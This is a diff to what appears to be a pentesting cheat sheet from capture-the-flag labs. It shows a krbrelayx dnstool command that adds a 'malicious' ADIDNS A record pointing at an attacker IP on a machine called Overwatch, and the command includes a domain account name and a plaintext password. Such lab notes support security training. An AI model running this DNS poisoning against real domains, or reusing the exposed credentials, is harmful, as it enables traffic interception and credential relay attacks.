@@ -7,7 +7,7 @@ Python tool from the `krbrelayx` project used to create/modify/delete ADIDNS rec
 ### Add a malicious A record pointing to the attacker machine
 ```bash
 dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
-  --action add --record SQL07 --data <ATTACKER_IP> 10.129.28.165
+  --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP
 ```
 Used on: **Overwatch**
 
